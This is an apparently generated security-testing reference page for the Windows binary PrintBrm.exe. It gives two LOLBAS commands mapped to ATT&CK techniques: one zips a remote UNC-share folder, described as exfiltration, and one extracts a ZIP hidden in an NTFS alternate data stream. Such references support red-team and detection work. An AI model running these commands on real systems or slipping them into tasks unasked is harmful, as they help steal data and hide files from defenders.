---
parsed_by: focuslocust
source: commands
type: generated
---
# PrintBrm Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## PrintBrm.exe

Tool page: [PrintBrm.exe](../../tools/windows/printbrm.exe.md)

### Exfiltrate the contents of a remote folder on a UNC share into a zip file

```text
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
```

Description:

Create a ZIP file from a folder in a remote drive

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/PrintBrm.yml` |
| Evidence | Command preserved from source parser. |

### Decompress and extract a ZIP file stored on an alternate data stream to a new folder

```text
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
```

Description:

Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/PrintBrm.yml` |
| Evidence | Command preserved from source parser. |
